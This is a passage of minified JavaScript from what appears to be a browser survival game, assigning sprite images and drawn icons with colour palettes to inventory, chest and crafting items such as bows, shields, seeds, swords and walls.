                    sprite[ze.INV_MACHETE][1] = IMAGES.INV_MACHETE_IN,
                    sprite[ze.INV_MACHETE][2] = IMAGES.INV_MACHETE_CLICK,
                    sprite[ze.CHEST_MACHETE] = sprite[ze.INV_MACHETE],
                    sprite[ze.CRAFT_MACHETE] = sprite[ze.INV_MACHETE],
                    sprite[ze.INV_SLED] = [],
                    sprite[ze.INV_SLED][0] = IMAGES.INV_SLED_OUT,
                    sprite[ze.INV_SLED][1] = IMAGES.INV_SLED_IN,
                    sprite[ze.INV_SLED][2] = IMAGES.INV_SLED_CLICK,
                    sprite[ze.CHEST_SLED] = sprite[ze.INV_SLED],
                    sprite[ze.CRAFT_SLED] = sprite[ze.INV_SLED],
                    sprite[ze.INV_PIRATE_HAT] = [],
                    sprite[ze.INV_PIRATE_HAT][0] = IMAGES.INV_PIRATE_HAT_OUT,
                    sprite[ze.INV_PIRATE_HAT][1] = IMAGES.INV_PIRATE_HAT_IN,
                    sprite[ze.INV_PIRATE_HAT][2] = IMAGES.INV_PIRATE_HAT_CLICK,
                    sprite[ze.CHEST_PIRATE_HAT] = sprite[ze.INV_PIRATE_HAT],
                    sprite[ze.CRAFT_PIRATE_HAT] = sprite[ze.INV_PIRATE_HAT],
                    sprite[ze.INV_FUR_MAMMOTH] = [],
                    sprite[ze.INV_FUR_MAMMOTH][0] = IMAGES.INV_FUR_MAMMOTH_OUT,
                    sprite[ze.INV_FUR_MAMMOTH][1] = IMAGES.INV_FUR_MAMMOTH_IN,
                    sprite[ze.INV_FUR_MAMMOTH][2] = IMAGES.INV_FUR_MAMMOTH_CLICK,
                    sprite[ze.CHEST_FUR_MAMMOTH] = sprite[ze.INV_FUR_MAMMOTH],
                    sprite[ze.INV_FUR_HAT] = [],
                    sprite[ze.INV_FUR_HAT][0] = IMAGES.INV_FUR_HAT_OUT,
                    sprite[ze.INV_FUR_HAT][1] = IMAGES.INV_FUR_HAT_IN,
                    sprite[ze.INV_FUR_HAT][2] = IMAGES.INV_FUR_HAT_CLICK,
                    sprite[ze.CHEST_FUR_HAT] = sprite[ze.INV_FUR_HAT],
                    sprite[ze.CRAFT_FUR_HAT] = sprite[ze.INV_FUR_HAT],
                    sprite[ze.INV_WOOD_BOW] = [],
                    sprite[ze.INV_WOOD_BOW][0] = IMAGES.INV_WOOD_BOW_OUT,
                    sprite[ze.INV_WOOD_BOW][1] = IMAGES.INV_WOOD_BOW_IN,
                    sprite[ze.INV_WOOD_BOW][2] = IMAGES.INV_WOOD_BOW_CLICK,
                    sprite[ze.CHEST_WOOD_BOW] = sprite[ze.INV_WOOD_BOW],
                    sprite[ze.CRAFT_WOOD_BOW] = sprite[ze.INV_WOOD_BOW],
                    sprite[ze.INV_WOOD_ARROW] = [],
                    sprite[ze.INV_WOOD_ARROW][0] = IMAGES.INV_WOOD_ARROW_OUT,
                    sprite[ze.INV_WOOD_ARROW][1] = IMAGES.INV_WOOD_ARROW_IN,
                    sprite[ze.INV_WOOD_ARROW][2] = IMAGES.INV_WOOD_ARROW_CLICK,
                    sprite[ze.CHEST_WOOD_ARROW] = sprite[ze.INV_WOOD_ARROW],
                    sprite[ze.CRAFT_WOOD_ARROW] = sprite[ze.INV_WOOD_ARROW],
                    sprite[ze.INV_STONE_BOW] = [],
                    sprite[ze.INV_STONE_BOW][0] = IMAGES.INV_STONE_BOW_OUT,
                    sprite[ze.INV_STONE_BOW][1] = IMAGES.INV_STONE_BOW_IN,
                    sprite[ze.INV_STONE_BOW][2] = IMAGES.INV_STONE_BOW_CLICK,
                    sprite[ze.CHEST_STONE_BOW] = sprite[ze.INV_STONE_BOW],
                    sprite[ze.CRAFT_STONE_BOW] = sprite[ze.INV_STONE_BOW],
                    sprite[ze.INV_STONE_ARROW] = [],
                    sprite[ze.INV_STONE_ARROW][0] = IMAGES.INV_STONE_ARROW_OUT,
                    sprite[ze.INV_STONE_ARROW][1] = IMAGES.INV_STONE_ARROW_IN,
                    sprite[ze.INV_STONE_ARROW][2] = IMAGES.INV_STONE_ARROW_CLICK,
                    sprite[ze.CHEST_STONE_ARROW] = sprite[ze.INV_STONE_ARROW],
                    sprite[ze.CRAFT_STONE_ARROW] = sprite[ze.INV_STONE_ARROW],
                    sprite[ze.INV_GOLD_BOW] = [],
                    sprite[ze.INV_GOLD_BOW][0] = IMAGES.INV_GOLD_BOW_OUT,
                    sprite[ze.INV_GOLD_BOW][1] = IMAGES.INV_GOLD_BOW_IN,
                    sprite[ze.INV_GOLD_BOW][2] = IMAGES.INV_GOLD_BOW_CLICK,
                    sprite[ze.CHEST_GOLD_BOW] = sprite[ze.INV_GOLD_BOW],
                    sprite[ze.CRAFT_GOLD_BOW] = sprite[ze.INV_GOLD_BOW],
                    sprite[ze.INV_GOLD_ARROW] = [],
                    sprite[ze.INV_GOLD_ARROW][0] = IMAGES.INV_GOLD_ARROW_OUT,
                    sprite[ze.INV_GOLD_ARROW][1] = IMAGES.INV_GOLD_ARROW_IN,
                    sprite[ze.INV_GOLD_ARROW][2] = IMAGES.INV_GOLD_ARROW_CLICK,
                    sprite[ze.CHEST_GOLD_ARROW] = sprite[ze.INV_GOLD_ARROW],
                    sprite[ze.CRAFT_GOLD_ARROW] = sprite[ze.INV_GOLD_ARROW],
                    sprite[ze.INV_DIAMOND_BOW] = [],
                    sprite[ze.INV_DIAMOND_BOW][0] = IMAGES.INV_DIAMOND_BOW_OUT,
                    sprite[ze.INV_DIAMOND_BOW][1] = IMAGES.INV_DIAMOND_BOW_IN,
                    sprite[ze.INV_DIAMOND_BOW][2] = IMAGES.INV_DIAMOND_BOW_CLICK,
                    sprite[ze.CHEST_DIAMOND_BOW] = sprite[ze.INV_DIAMOND_BOW],
                    sprite[ze.CRAFT_DIAMOND_BOW] = sprite[ze.INV_DIAMOND_BOW],
                    sprite[ze.INV_DIAMOND_ARROW] = [],
                    sprite[ze.INV_DIAMOND_ARROW][0] = IMAGES.INV_DIAMOND_ARROW_OUT,
                    sprite[ze.INV_DIAMOND_ARROW][1] = IMAGES.INV_DIAMOND_ARROW_IN,
                    sprite[ze.INV_DIAMOND_ARROW][2] = IMAGES.INV_DIAMOND_ARROW_CLICK,
                    sprite[ze.CHEST_DIAMOND_ARROW] = sprite[ze.INV_DIAMOND_ARROW],
                    sprite[ze.CRAFT_DIAMOND_ARROW] = sprite[ze.INV_DIAMOND_ARROW],
                    sprite[ze.INV_AMETHYST_BOW] = [],
                    sprite[ze.INV_AMETHYST_BOW][0] = IMAGES.INV_AMETHYST_BOW_OUT,
                    sprite[ze.INV_AMETHYST_BOW][1] = IMAGES.INV_AMETHYST_BOW_IN,
                    sprite[ze.INV_AMETHYST_BOW][2] = IMAGES.INV_AMETHYST_BOW_CLICK,
                    sprite[ze.CHEST_AMETHYST_BOW] = sprite[ze.INV_AMETHYST_BOW],
                    sprite[ze.CRAFT_AMETHYST_BOW] = sprite[ze.INV_AMETHYST_BOW],
                    sprite[ze.INV_AMETHYST_ARROW] = [],
                    sprite[ze.INV_AMETHYST_ARROW][0] = IMAGES.INV_AMETHYST_ARROW_OUT,
                    sprite[ze.INV_AMETHYST_ARROW][1] = IMAGES.INV_AMETHYST_ARROW_IN,
                    sprite[ze.INV_AMETHYST_ARROW][2] = IMAGES.INV_AMETHYST_ARROW_CLICK,
                    sprite[ze.CHEST_AMETHYST_ARROW] = sprite[ze.INV_AMETHYST_ARROW],
                    sprite[ze.CRAFT_AMETHYST_ARROW] = sprite[ze.INV_AMETHYST_ARROW],
                    sprite[ze.INV_REIDITE_BOW] = [],
                    sprite[ze.INV_REIDITE_BOW][0] = IMAGES.INV_REIDITE_BOW_OUT,
                    sprite[ze.INV_REIDITE_BOW][1] = IMAGES.INV_REIDITE_BOW_IN,
                    sprite[ze.INV_REIDITE_BOW][2] = IMAGES.INV_REIDITE_BOW_CLICK,
                    sprite[ze.CHEST_REIDITE_BOW] = sprite[ze.INV_REIDITE_BOW],
                    sprite[ze.CRAFT_REIDITE_BOW] = sprite[ze.INV_REIDITE_BOW],
                    sprite[ze.INV_REIDITE_ARROW] = [],
                    sprite[ze.INV_REIDITE_ARROW][0] = IMAGES.INV_REIDITE_ARROW_OUT,
                    sprite[ze.INV_REIDITE_ARROW][1] = IMAGES.INV_REIDITE_ARROW_IN,
                    sprite[ze.INV_REIDITE_ARROW][2] = IMAGES.INV_REIDITE_ARROW_CLICK,
                    sprite[ze.CHEST_REIDITE_ARROW] = sprite[ze.INV_REIDITE_ARROW],
                    sprite[ze.CRAFT_REIDITE_ARROW] = sprite[ze.INV_REIDITE_ARROW],
                    sprite[ze.INV_DRAGON_BOW] = [],
                    sprite[ze.INV_DRAGON_BOW][0] = IMAGES.INV_DRAGON_BOW_OUT,
                    sprite[ze.INV_DRAGON_BOW][1] = IMAGES.INV_DRAGON_BOW_IN,
                    sprite[ze.INV_DRAGON_BOW][2] = IMAGES.INV_DRAGON_BOW_CLICK,
                    sprite[ze.CHEST_DRAGON_BOW] = sprite[ze.INV_DRAGON_BOW],
                    sprite[ze.CRAFT_DRAGON_BOW] = sprite[ze.INV_DRAGON_BOW],
                    sprite[ze.INV_DRAGON_ARROW] = [],
                    sprite[ze.INV_DRAGON_ARROW][0] = IMAGES.INV_DRAGON_ARROW_OUT,
                    sprite[ze.INV_DRAGON_ARROW][1] = IMAGES.INV_DRAGON_ARROW_IN,
                    sprite[ze.INV_DRAGON_ARROW][2] = IMAGES.INV_DRAGON_ARROW_CLICK,
                    sprite[ze.CHEST_DRAGON_ARROW] = sprite[ze.INV_DRAGON_ARROW],
                    sprite[ze.CRAFT_DRAGON_ARROW] = sprite[ze.INV_DRAGON_ARROW],
                    sprite[ze.INV_WOOD_SHIELD] = [],
                    sprite[ze.INV_WOOD_SHIELD][0] = IMAGES.INV_WOOD_SHIELD_OUT,
                    sprite[ze.INV_WOOD_SHIELD][1] = IMAGES.INV_WOOD_SHIELD_IN,
                    sprite[ze.INV_WOOD_SHIELD][2] = IMAGES.INV_WOOD_SHIELD_CLICK,
                    sprite[ze.CHEST_WOOD_SHIELD] = sprite[ze.INV_WOOD_SHIELD],
                    sprite[ze.CRAFT_WOOD_SHIELD] = sprite[ze.INV_WOOD_SHIELD],
                    sprite[ze.INV_STONE_SHIELD] = [],
                    sprite[ze.INV_STONE_SHIELD][0] = IMAGES.INV_STONE_SHIELD_OUT,
                    sprite[ze.INV_STONE_SHIELD][1] = IMAGES.INV_STONE_SHIELD_IN,
                    sprite[ze.INV_STONE_SHIELD][2] = IMAGES.INV_STONE_SHIELD_CLICK,
                    sprite[ze.CHEST_STONE_SHIELD] = sprite[ze.INV_STONE_SHIELD],
                    sprite[ze.CRAFT_STONE_SHIELD] = sprite[ze.INV_STONE_SHIELD],
                    sprite[ze.INV_GOLD_SHIELD] = [],
                    sprite[ze.INV_GOLD_SHIELD][0] = IMAGES.INV_GOLD_SHIELD_OUT,
                    sprite[ze.INV_GOLD_SHIELD][1] = IMAGES.INV_GOLD_SHIELD_IN,
                    sprite[ze.INV_GOLD_SHIELD][2] = IMAGES.INV_GOLD_SHIELD_CLICK,
                    sprite[ze.CHEST_GOLD_SHIELD] = sprite[ze.INV_GOLD_SHIELD],
                    sprite[ze.CRAFT_GOLD_SHIELD] = sprite[ze.INV_GOLD_SHIELD],
                    sprite[ze.INV_DIAMOND_SHIELD] = [],
                    sprite[ze.INV_DIAMOND_SHIELD][0] = IMAGES.INV_DIAMOND_SHIELD_OUT,
                    sprite[ze.INV_DIAMOND_SHIELD][1] = IMAGES.INV_DIAMOND_SHIELD_IN,
                    sprite[ze.INV_DIAMOND_SHIELD][2] = IMAGES.INV_DIAMOND_SHIELD_CLICK,
                    sprite[ze.CHEST_DIAMOND_SHIELD] = sprite[ze.INV_DIAMOND_SHIELD],
                    sprite[ze.CRAFT_DIAMOND_SHIELD] = sprite[ze.INV_DIAMOND_SHIELD],
                    sprite[ze.INV_AMETHYST_SHIELD] = [],
                    sprite[ze.INV_AMETHYST_SHIELD][0] = IMAGES.INV_AMETHYST_SHIELD_OUT,
                    sprite[ze.INV_AMETHYST_SHIELD][1] = IMAGES.INV_AMETHYST_SHIELD_IN,
                    sprite[ze.INV_AMETHYST_SHIELD][2] = IMAGES.INV_AMETHYST_SHIELD_CLICK,
                    sprite[ze.CHEST_AMETHYST_SHIELD] = sprite[ze.INV_AMETHYST_SHIELD],
                    sprite[ze.CRAFT_AMETHYST_SHIELD] = sprite[ze.INV_AMETHYST_SHIELD],
                    sprite[ze.INV_REIDITE_SHIELD] = [],
                    sprite[ze.INV_REIDITE_SHIELD][0] = IMAGES.INV_REIDITE_SHIELD_OUT,
                    sprite[ze.INV_REIDITE_SHIELD][1] = IMAGES.INV_REIDITE_SHIELD_IN,
                    sprite[ze.INV_REIDITE_SHIELD][2] = IMAGES.INV_REIDITE_SHIELD_CLICK,
                    sprite[ze.CHEST_REIDITE_SHIELD] = sprite[ze.INV_REIDITE_SHIELD],
                    sprite[ze.CRAFT_REIDITE_SHIELD] = sprite[ze.INV_REIDITE_SHIELD],
                    sprite[ze.INV_FLOWER_HAT] = [],
                    sprite[ze.INV_FLOWER_HAT][0] = IMAGES.INV_FLOWER_HAT_OUT,
                    sprite[ze.INV_FLOWER_HAT][1] = IMAGES.INV_FLOWER_HAT_IN,
                    sprite[ze.INV_FLOWER_HAT][2] = IMAGES.INV_FLOWER_HAT_CLICK,
                    sprite[ze.CHEST_FLOWER_HAT] = sprite[ze.INV_FLOWER_HAT],
                    sprite[ze.CRAFT_FLOWER_HAT] = sprite[ze.INV_FLOWER_HAT],
                    sprite[ze.INV_SANDWORM_JUICE] = [],
                    sprite[ze.INV_SANDWORM_JUICE][0] = IMAGES.INV_SANDWORM_JUICE_OUT,
                    sprite[ze.INV_SANDWORM_JUICE][1] = IMAGES.INV_SANDWORM_JUICE_IN,
                    sprite[ze.INV_SANDWORM_JUICE][2] = IMAGES.INV_SANDWORM_JUICE_CLICK,
                    sprite[ze.CHEST_SANDWORM_JUICE] = sprite[ze.INV_SANDWORM_JUICE],
                    sprite[ze.CRAFT_SANDWORM_JUICE] = sprite[ze.INV_SANDWORM_JUICE],
                    sprite[ze.INV_GARLIC] = O(1, [{
                        f: n1,
                        x: 0,
                        y: 0,
                        a: 1,
                        r: 0,
                        c: ["#352b10", "#e8e8e8", "#bbbbbb", "#e0e1e0", "#c4c4c4"]
                    }], .22, ["#3ba578", "#4eb687", "#3da34d"], .5),
                    sprite[ze.CHEST_GARLIC] = sprite[ze.INV_GARLIC],
                    sprite[ze.INV_THORNBUSH] = O(1, [{
                        f: b0,
                        x: 0,
                        y: 0,
                        a: 1,
                        r: 0,
                        c: ["#352b10", "#349970", "#245c45", "#348361", "#e8e8e8", "#bbbbbb"]
                    }], .2, ["#3ba578", "#4eb687", "#3da34d"], .5),
                    sprite[ze.CHEST_THORNBUSH] = sprite[ze.INV_THORNBUSH],
                    sprite[ze.INV_WINDMILL] = O(1, [{
                        f: D1,
                        x: -1,
                        y: 0,
                        a: 1,
                        r: 0,
                        c: ["#0d1b1c", "#596560", "#394841", "#67766F", "#46554D", "#4C3B19", "#674C2A", "#7C5A29", "#596560", "#394841"]
                    }, {
                        f: v1,
                        x: -1,
                        y: 0,
                        a: 1,
                        r: 0,
                        c: ["#0d1b1c", "#596560", "#394841", "#67766F", "#46554D", "#4C3B19", "#674C2A", "#7C5A29", "#596560", "#394841"]
                    }, {
                        f: M1,
                        x: -1,
                        y: 0,
                        a: 1,
                        r: 0,
                        c: ["#0d1b1c", "#596560", "#394841", "#67766F", "#46554D", "#4C3B19", "#674C2A", "#7C5A29", "#596560", "#394841"]
                    }], .4, ["#3ba578", "#4eb687", "#3da34d"], .5),
                    sprite[ze.CRAFT_WINDMILL] = sprite[ze.INV_WINDMILL],
                    sprite[ze.INV_WILD_WHEAT] = O(1, [{
                        f: m1,
                        x: 0,
                        y: 0,
                        a: 1,
                        r: 0,
                        c: ["#A89F67", "#9E8456"]
                    }], 1.2, ["#3ba578", "#4eb687", "#3da34d"], .5),
                    sprite[ze.INV_SIGN] = O(1, [{
                        f: _i,
                        x: 0,
                        y: 0,
                        a: 1,
                        r: 0,
                        c: ["#0d1b1c", "#44301b", "#57442a", "#523e26"]
                    }], .14, ["#3ba578", "#4eb687", "#3da34d"], .5),
                    sprite[ze.CRAFT_SIGN] = sprite[ze.INV_SIGN],
                    sprite[ze.INV_WHEAT_SEED] = O(1, [{
                        f: dt,
                        x: 0,
                        y: 0,
                        a: 1,
                        r: 0,
                        c: ["#A89F67", "#9E8456"]
                    }], .6, ["#3ba578", "#4eb687", "#3da34d"], .5),
                    sprite[ze.CRAFT_WHEAT_SEED] = sprite[ze.INV_WHEAT_SEED],
                    sprite[ze.INV_SEED] = O(1, [{
                        f: dt,
                        x: 0,
                        y: 0,
                        a: 1,
                        r: 0,
                        c: ["#493d36", "#332b28"]
                    }], .7, ["#3ba578", "#4eb687", "#3da34d"], .5),
                    sprite[ze.CRAFT_SEED] = sprite[ze.INV_SEED],
                    sprite[ze.INV_PUMPKIN_SEED] = O(1, [{
                        f: dt,
                        x: 0,
                        y: 0,
                        a: 1,
                        r: 0,
                        c: ["#c67933", "#b17238"]
                    }], .6, ["#3ba578", "#4eb687", "#3da34d"], .5),
                    sprite[ze.CRAFT_PUMPKIN_SEED] = sprite[ze.INV_PUMPKIN_SEED],
                    sprite[ze.INV_GARLIC_SEED] = O(1, [{
                        f: dt,
                        x: 0,
                        y: 0,
                        a: 1,
                        r: 0,
                        c: ["#e8e8e8", "#bbbbbb"]
                    }], .6, ["#3ba578", "#4eb687", "#3da34d"], .5),
                    sprite[ze.CRAFT_GARLIC_SEED] = sprite[ze.INV_GARLIC_SEED],
                    sprite[ze.INV_THORNBUSH_SEED] = O(1, [{
                        f: dt,
                        x: 0,
                        y: 0,
                        a: 1,
                        r: 0,
                        c: ["#328a56", "#449573"]
                    }], .6, ["#3ba578", "#4eb687", "#3da34d"], .5),
                    sprite[ze.CRAFT_THORNBUSH_SEED] = sprite[ze.INV_THORNBUSH_SEED],
                    sprite[ze.INV_CARROT_SEED] = O(1, [{
                        f: dt,
                        x: 0,
                        y: 0,
                        a: 1,
                        r: 0,
                        c: ["#c98e2f", "#a36b11"]
                    }], .6, ["#3ba578", "#4eb687", "#3da34d"], .5),
                    sprite[ze.CRAFT_CARROT_SEED] = sprite[ze.INV_CARROT_SEED],
                    sprite[ze.CHEST_CARROT_SEED] = sprite[ze.INV_CARROT_SEED],
                    sprite[ze.INV_WATERMELON_SEED] = O(1, [{
                        f: dt,
                        x: 0,
                        y: 0,
                        a: 1,
                        r: 0,
                        c: ["#13a56d", "#098a58"]
                    }], .6, ["#3ba578", "#4eb687", "#3da34d"], .5),
                    sprite[ze.CRAFT_WATERMELON_SEED] = sprite[ze.INV_WATERMELON_SEED],
                    sprite[ze.CHEST_WATERMELON_SEED] = sprite[ze.INV_WATERMELON_SEED],
                    sprite[ze.INV_ALOE_VERA_SEED] = O(1, [{
                        f: dt,
                        x: 0,
                        y: 0,
                        a: 1,
                        r: 0,
                        c: ["#3a8214", "#4a9c1e"]
                    }], .6, ["#3ba578", "#4eb687", "#3da34d"], .5),
                    sprite[ze.CRAFT_ALOE_VERA_SEED] = sprite[ze.INV_ALOE_VERA_SEED],
                    sprite[ze.CHEST_ALOE_VERA_SEED] = sprite[ze.INV_ALOE_VERA_SEED],
                    sprite[ze.INV_TOMATO_SEED] = O(1, [{
                        f: dt,
                        x: 0,
                        y: 0,
                        a: 1,
                        r: 0,
                        c: ["#b22419", "#99110e"]
                    }], .6, ["#3ba578", "#4eb687", "#3da34d"], .5),
                    sprite[ze.CRAFT_TOMATO_SEED] = sprite[ze.INV_TOMATO_SEED],
                    sprite[ze.CHEST_TOMATO_SEED] = sprite[ze.INV_TOMATO_SEED],
                    sprite[ze.INV_FIRE] = O(1, [{
                        f: P1,
                        x: -2,
                        y: -2,
                        a: 1,
                        r: -Math.PI / 7,
                        c: ["#4d2d14", "#432516"]
                    }, {
                        f: H1,
                        x: -2,
                        y: -2,
                        a: 1,
                        r: -Math.PI / 7,
                        c: ["#efd435", "#ec8d35", "#e96132"]
                    }], .3, ["#3ba578", "#4eb687", "#3da34d"], .5),
                    sprite[ze.CRAFT_FIRE] = sprite[ze.INV_FIRE],
                    sprite[ze.INV_BIG_FIRE] = O(1, [{
                        f: G1,
                        x: -2,
                        y: -1,
                        a: 1,
                        r: -Math.PI / 7,
                        c: ["#4d2d14", "#432516", "#58645F", "#75827D", "#0c2c2e"]
                    }, {
                        f: H1,
                        x: -2,
                        y: -1,
                        a: 1,
                        r: -Math.PI / 7,
                        c: ["#efd435", "#ec8d35", "#e96132"]
                    }], .3, ["#3ba578", "#4eb687", "#3da34d"], .5),
                    sprite[ze.CRAFT_BIG_FIRE] = sprite[ze.INV_BIG_FIRE],
                    sprite[ze.INV_PIRATE_SWORD] = O(1, [{
                        f: q1,
                        x: 2,
                        y: 0,
                        a: 1,
                        r: Math.PI / 5,
                        c: ["#0d1b1c", "#4a3a22", "#362818", "#c7c7c7", "#909090", "#eceaea", "#bbbbbb", "#d6d1d1"]
                    }], .1, ["#35b1b5", "#46c2c9", "#33b4e4"], .5),
                    sprite[ze.INV_SUGAR_CAN] = O(1, [{
                        f: st,
                        x: 2,
                        y: 0,
                        a: 1,
                        r: Math.PI / 5,
                        c: ["#0d1b1c", "#ffffff", "#5f6061", "#eb2933", "#57b74e", "#42a54d", "#ac222a", "#e6636a"]
                    }], .3, ["#35b1b5", "#46c2c9", "#33b4e4"], .5),
                    sprite[ze.INV_SWORD_WOOD] = O(1, [{
                        f: j1,
                        x: 2,
                        y: 0,
                        a: 1,
                        r: Math.PI / 5,
                        c: ["#252525", "#73583e", "#493425", "#7d6144", "#5e4530", "#563e2b"]
                    }], .15, ["#35b1b5", "#46c2c9", "#33b4e4"], .5),
                    sprite[ze.INV_SWORD] = O(1, [{
                        f: Q1,
                        x: 2,
                        y: 0,
                        a: 1,
                        r: Math.PI / 5,
                        c: ["#0d1b1c", "#939393", "#5f6061", "#b1afaf", "#493d36", "#332b28"]
                    }], .15, ["#35b1b5", "#46c2c9", "#33b4e4"], .5),
                    sprite[ze.INV_SWORD_GOLD] = O(1, [{
                        f: rt,
                        x: 2,
                        y: 0,
                        a: 1,
                        r: Math.PI / 5,
                        c: ["#0d1b1c", "#c4bc51", "#b29c32", "#c4bc51", "#493e26", "#382e19"]
                    }], .15, ["#35b1b5", "#46c2c9", "#33b4e4"], .5),
                    sprite[ze.INV_SWORD_DIAMOND] = O(1, [{
                        f: ot,
                        x: 2,
                        y: 0,
                        a: 1,
                        r: Math.PI / 5,
                        c: ["#0d1b1c", "#6ad9e8", "#29aaa1", "#95e9f5", "#022320", "#011e19", "#FFFFFF"]
                    }], .15, ["#35b1b5", "#46c2c9", "#33b4e4"], .5),
                    sprite[ze.INV_SWORD_AMETHYST] = O(1, [{
                        f: at,
                        x: 2,
                        y: 0,
                        a: 1,
                        r: Math.PI / 5,
                        c: ["#0d1b1c", "#b864d6", "#8c29aa", "#cc81e7", "#262114", "#211108", "#FFFFFF"]
                    }], .15, ["#35b1b5", "#46c2c9", "#33b4e4"], .5),
                    sprite[ze.INV_PICK_WOOD] = O(1, [{
                        f: X1,
                        x: -2,
                        y: 5,
                        a: 1,
                        r: -Math.PI / 5,
                        c: ["#0d1b1c", "#000000", "#0d1b1c", "#4d2d14", "#432516", "#4d2d14", "#432516"]
                    }], .45, ["#35b1b5", "#46c2c9", "#33b4e4"], .5),
                    sprite[ze.INV_PICK] = O(1, [{
                        f: X1,
                        x: -2,
                        y: 5,
                        a: 1,
                        r: -Math.PI / 5,
                        c: ["#0d1b1c", "#000000", "#0d1b1c", "#4d2d14", "#432516", "#939393", "#5f6061"]
                    }], .45, ["#35b1b5", "#46c2c9", "#33b4e4"], .5),
                    sprite[ze.INV_PICK_GOLD] = O(1, [{
                        f: X1,
                        x: -2,
                        y: 5,
                        a: 1,
                        r: -Math.PI / 5,
                        c: ["#0d1b1c", "#000000", "#0d1b1c", "#493e26", "#382e19", "#c4bc51", "#b29c32"]
                    }], .45, ["#35b1b5", "#46c2c9", "#33b4e4"], .5),
                    sprite[ze.INV_PICK_DIAMOND] = O(1, [{
                        f: X1,
                        x: -2,
                        y: 5,
                        a: 1,
                        r: -Math.PI / 5,
                        c: ["#0d1b1c", "#000000", "#0d1b1c", "#262114", "#211108", "#63c9d6", "#29aaa1"]
                    }], .45, ["#35b1b5", "#46c2c9", "#33b4e4"], .5),
                    sprite[ze.INV_PICK_AMETHYST] = O(1, [{
                        f: X1,
                        x: -2,
                        y: 5,
                        a: 1,
                        r: -Math.PI / 5,
                        c: ["#0d1b1c", "#000000", "#0d1b1c", "#262114", "#211108", "#b864d6", "#8c29aa"]
                    }], .45, ["#35b1b5", "#46c2c9", "#33b4e4"], .5),
                    sprite[ze.INV_PICK_REIDITE] = [],
                    sprite[ze.INV_PICK_REIDITE][0] = IMAGES.INV_PICK_REIDITE_OUT,
                    sprite[ze.INV_PICK_REIDITE][1] = IMAGES.INV_PICK_REIDITE_IN,
                    sprite[ze.INV_PICK_REIDITE][2] = IMAGES.INV_PICK_REIDITE_CLICK,
                    sprite[ze.CRAFT_PICK_REIDITE] = sprite[ze.INV_PICK_REIDITE],
                    sprite[ze.CHEST_PICK_REIDITE] = sprite[ze.INV_PICK_REIDITE],
                    sprite[ze.INV_STONE] = O(1, [{
                        f: At,
                        x: -5,
                        y: -5,
                        a: 1,
                        r: 0,
                        c: ["#252B28", "#58645F", "#75827D"]
                    }], .23, ["#2b5c48", "#2b5c48", "#2b5c48"], .5),
                    sprite[ze.INV_GOLD] = O(1, [{
                        f: lt,
                        x: -5,
                        y: -5,
                        a: 1,
                        r: 0,
                        c: ["#282823", "#877c2d", "#c4bc51"]
                    }], .43, ["#2b5c48", "#2b5c48", "#2b5c48"], .5),
                    sprite[ze.INV_DIAMOND] = O(1, [{
                        f: It,
                        x: -5,
                        y: -5,
                        a: 1,
                        r: 0,
                        c: ["#232828", "#3fc9c9", "#74ede6"]
                    }], .33, ["#2b5c48", "#2b5c48", "#2b5c48"], .5),
                    sprite[ze.INV_WOOD] = O(1, [{
                        f: P1,
                        x: 0,
                        y: -5,
                        a: 1,
                        r: Math.PI / 2.5,
                        c: ["#4d2d14", "#432516"]
                    }], .3, ["#2b5c48", "#2b5c48", "#2b5c48"], .5),
                    sprite[ze.CRAFT_SWORD_WOOD] = sprite[ze.INV_SWORD_WOOD],
                    sprite[ze.CRAFT_SWORD] = sprite[ze.INV_SWORD],
                    sprite[ze.CRAFT_SWORD_GOLD] = sprite[ze.INV_SWORD_GOLD],
                    sprite[ze.CRAFT_SWORD_DIAMOND] = sprite[ze.INV_SWORD_DIAMOND],
                    sprite[ze.CRAFT_SWORD_AMETHYST] = sprite[ze.INV_SWORD_AMETHYST],
                    sprite[ze.CRAFT_PICK_WOOD] = sprite[ze.INV_PICK_WOOD],
                    sprite[ze.CRAFT_PICK] = sprite[ze.INV_PICK],
                    sprite[ze.CRAFT_PICK_GOLD] = sprite[ze.INV_PICK_GOLD],
                    sprite[ze.CRAFT_PICK_DIAMOND] = sprite[ze.INV_PICK_DIAMOND],
                    sprite[ze.CRAFT_PICK_AMETHYST] = sprite[ze.INV_PICK_AMETHYST],
                    sprite[ze.INV_PLANT] = O(1, [{
                        f: l1,
                        x: 0,
                        y: 0,
                        a: 1,
                        r: 0
                    }], .4, ["#3ba578", "#4eb687", "#3da34d"], .5),
                    sprite[ze.INV_WORK] = O(1, [{
                        f: O1,
                        x: 0,
                        y: 0,
                        a: 1,
                        r: 0,
                        c: ["#0d1b1c", "#4d2d14", "#432516", "#756e52", "#663f22", "#9e9577"]
                    }], .45, ["#3ba578", "#4eb687", "#3da34d"], .5),
                    sprite[ze.CRAFT_WORK] = sprite[ze.INV_WORK],
                    sprite[ze.INV_STONE_WALL] = O(1, [{
                        f: Lt,
                        x: -2,
                        y: -2,
                        a: 1,
                        r: 0,
                        c: ["#0d1b1c", "#6a7570", "#939995", "#9baaa3", "#adbcb5", "#8a938e"]
                    }], .4, ["#3ba578", "#4eb687", "#3da34d"], .5),
                    sprite[ze.CRAFT_STONE_WALL] = sprite[ze.INV_STONE_WALL],
                    sprite[ze.INV_DIAMOND_WALL] = O(1, [{
                        f: vt,
                        x: 0,
                        y: 0,
                        a: 1,
                        r: 0,
                        c: ["#0d1b1c", "#5cc5ce", "#89d1d4", "#86d0d1", "#95d5d8", "#e0f2f6", "#b3e0e3"]
                    }], .4, ["#3ba578", "#4eb687", "#3da34d"], .5),
                    sprite[ze.CRAFT_DIAMOND_WALL] = sprite[ze.INV_DIAMOND_WALL],
                    sprite[ze.INV_AMETHYST_WALL] = O(1, [{
                        f: Lt,
                        x: 0,
                        y: 0,
                        a: 1,
                        r: 0,
                        c: ["#0d1b1c", "#b15ecf", "#8c29aa", "#c26de0", "#af59cd", "#d588f1"]
                    }], .4, ["#3ba578", "#4eb687", "#3da34d"], .5),
                    sprite[ze.CRAFT_AMETHYST_WALL] = sprite[ze.INV_AMETHYST_WALL],
                    sprite[ze.INV_GOLD_WALL] = O(1, [{
                        f: Gt,
                        x: 0,
                        y: 0,
                        a: 1,
                        r: 0,
                        c: ["#0d1b1c", "#877d36", "#a08f47", "#a7983c", "#b29e4d", "#c1b06b"]
                    }], .4, ["#3ba578", "#4eb687", "#3da34d"], .5),
                    sprite[ze.CRAFT_GOLD_WALL] = sprite[ze.INV_GOLD_WALL],
                    sprite[ze.INV_WALL] = O(1, [{
                        f: Dt,
                        x: 0,
                        y: 0,
                        a: 1,
                        r: 0,
                        c: ["#0d1b1c", "#4c3a15", "#634828", "#564021", "#634828", "#4c3a15"]
